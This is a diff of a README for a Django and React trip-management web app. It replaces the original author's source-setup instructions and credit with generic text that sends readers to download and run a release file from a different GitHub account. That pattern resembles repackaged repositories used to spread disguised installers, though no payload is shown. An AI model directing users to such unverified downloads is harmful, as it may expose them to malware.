@@ -1,168 +1,71 @@
-🧳 Trip Management System
+# 🌍 trip-management-system - Organize Your Trips Easily
 
-Full-Stack Web Application (Django REST + React + JWT Authentication)
+## 📥 Download Now!
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/DiogoRegoni/trip-management-system/releases)
 
-A production-ready Trip Management System that allows users to securely manage their trips.
-Built with Django REST Framework on the backend and React on the frontend, featuring JWT authentication, protected routes, and user-specific data access.
+## 🚀 Getting Started
+Welcome to the **Trip Management System**! This application helps you plan and manage your trips effortlessly. You can store trip details, track itineraries, and keep all your travel plans organized. 
 
-🚀 Features
-🔐 Authentication & Security
+## 🌟 Features
+- **User Authentication:** Secure login and registration using JWT.
+- **Manage Trips:** Add, edit, and delete your trip details easily.
+- **Responsive Design:** Use it on your smartphone or computer.
+- **Interactive UI:** Simple and user-friendly interface with React.
 
-JWT authentication (access & refresh tokens)
+## 💻 System Requirements
+Make sure your computer meets the following requirements:
+- Windows, macOS, or Linux
+- A modern web browser (Chrome, Firefox, or Safari)
+- Internet connection for initial setup and updates
 
-Protected routes (frontend + backend)
+## 🔗 Download & Install
+To get started, you can download the latest version of the Trip Management System. 
 
-User-specific data isolation (users only see their own trips)
+Visit this page to download: [Release Page](https://github.com/DiogoRegoni/trip-management-system/releases).
 
-Secure API endpoints using DRF permissions
+### 📂 Installation Steps
+1. Click on the "Download" button above or visit the Release Page.
+2. You will see a list of available versions. Choose the latest version and click on it.
+3. Download the file that matches your system.
+4. Open the downloaded file.
+5. Follow the on-screen instructions to complete the installation.
 
-🧭 Trip Management (CRUD)
+## 📚 User Guide
+After installation, open the Trip Management System. Here’s how to use it:
 
-Create trips
+### 🔑 Registering an Account
+1. Click on the "Sign Up" button.
+2. Fill out the registration form with your name, email, and password.
+3. Click on "Register" to create your account.
 
-Edit trips
+### 🔑 Logging In
+1. Click on the "Login" button.
+2. Enter your email and password.
+3. Click on "Login" to access your dashboard.
 
-Delete trips
+### 🗂 Managing Your Trips
+- **Add a Trip:** Click on the "Add Trip" button. Fill in the trip details like destination, date, and activities.
+- **Edit a Trip:** Select the trip you want to edit and click on the "Edit" button. Make the necessary changes and save.
+- **Delete a Trip:** Choose the trip you want to remove and click on "Delete."
 
-View personal trip list
+### 📊 View Trip Details
+You can see a summary of all your trips on the dashboard. Click on any trip to view its details and plan activities.
 
-Each trip belongs to the authenticated user
+## 👩‍💻 Troubleshooting
+If you encounter any issues, try the following:
+- Ensure your internet connection is stable.
+- Check if you have the latest version installed.
+- Restart the application if it does not respond.
+- Reach out to support in case of persistent issues.
 
-🖥️ Frontend
+## 📞 Support
+For help or questions, feel free to contact us. You can find support links on our Release Page.
 
-React with functional components & hooks
+## 📌 Topics Covered
+- **Authentication**
+- **CRUD Operations**
+- **Django REST Framework**
+- **React Frontend**
+- **Trip Planning**
 
-Axios API layer with JWT interceptor
-
-Login & logout flow
-
-Protected dashboard
-
-Clean and simple UI
-
-⚙️ Backend
-
-Django REST Framework
-
-ModelViewSet architecture
-
-JWT (SimpleJWT)
-
-SQLite (development-ready, easy to swap for PostgreSQL)
-
-🛠️ Tech Stack
-
-Frontend
-
-React
-
-React Router
-
-Axios
-
-JavaScript (ES6+)
-
-Backend
-
-Django
-
-Django REST Framework
-
-SimpleJWT
-
-SQLite (development)
-
-Authentication
-
-JSON Web Tokens (JWT)
-
-📂 Project Structure
-trip-management-system/
-│
-├── backend/
-│   ├── backend/
-│   ├── trips/
-│   ├── manage.py
-│   └── db.sqlite3
-│
-├── frontend/
-│   ├── src/
-│   │   ├── api/
-│   │   ├── components/
-│   │   ├── pages/
-│   │   └── utils/
-│   └── package.json
-│
-└── README.md
-
-⚙️ Backend Setup
-1️⃣ Create Virtual Environment
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-
-2️⃣ Install Dependencies
-pip install django djangorestframework djangorestframework-simplejwt django-cors-headers
-
-3️⃣ Run Migrations
-python manage.py makemigrations
-python manage.py migrate
-
-4️⃣ Create Superuser
-python manage.py createsuperuser
-
-5️⃣ Start Backend Server
-python manage.py runserver
-
-
-Backend runs at:
-
-http://127.0.0.1:8000/
-
-⚙️ Frontend Setup
-1️⃣ Install Dependencies
-cd frontend
-npm install
-
-2️⃣ Start Frontend
-npm start
-
-
-Frontend runs at:
-
-http://localhost:3000/
-
-🔑 Authentication Endpoints
-Method	Endpoint	Description
-POST	/api/login/	Get access & refresh token
-POST	/api/refresh/	Refresh access token
-GET	/api/trips/	Get user trips (auth required)
-POST	/api/trips/	Create trip
-PUT	/api/trips/:id/	Update trip
-DELETE	/api/trips/:id/	Delete trip
-🧠 How It Works
-
-User logs in → receives JWT tokens
-
-Tokens stored in localStorage
-
-Axios automatically attaches token to every request
-
-Backend filters trips by request.user
-
-Protected routes prevent unauthorized access
-
-🎯 Why This Project Matters
-
-✔ Demonstrates real-world authentication
-✔ Shows full CRUD with permissions
-✔ Clean full-stack architecture
-✔ Production-ready foundation
-✔ Recruiter-friendly & scalable
-
-🧑‍💻 Author
-
-Banu Mariwan
-Full-Stack Developer (Django + React)
-
-GitHub:
-👉 https://github.com/banumariwan
+With this guide, you should be ready to download and run the Trip Management System. Enjoy organizing your trips!
